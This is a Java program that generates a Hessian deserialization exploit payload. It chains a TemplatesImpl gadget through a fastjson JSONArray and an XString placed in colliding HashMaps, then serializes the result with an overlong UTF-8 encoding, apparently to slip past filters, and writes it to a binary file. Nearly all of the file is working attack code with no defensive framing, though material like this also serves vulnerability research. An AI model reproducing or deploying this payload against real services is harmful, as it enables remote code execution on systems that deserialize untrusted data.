package com.hessian.deser;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.hessian.Tools;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xpath.internal.objects.XString;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;

public class UTF_8_OverLong {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Tools.getTemplatesImpl();

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
//        jsonArray.toString();
//        JSONArray jsonArray = new JSONArray();
//        jsonArray.add(templates);
        XString xString = new XString("xx");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",jsonArray);
        map1.put("zZ",xString);
        map2.put("yy",xString);
        map2.put("zZ",jsonArray);

        HashMap<Object, Object> hashMap = Tools.makeMap(map1, map2);

        FileOutputStream fos = new FileOutputStream("D://1tmp//utf8.bin");
        Hessian2OutputWithOverlongEncoding output = new Hessian2OutputWithOverlongEncoding(fos);
        output.setSerializerFactory(new SerializerFactory());
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(hashMap);
        output.close();

//        FileInputStream fis = new FileInputStream("utf8.bin");
//        new Hessian2Input(fis).readObject();
    }
}
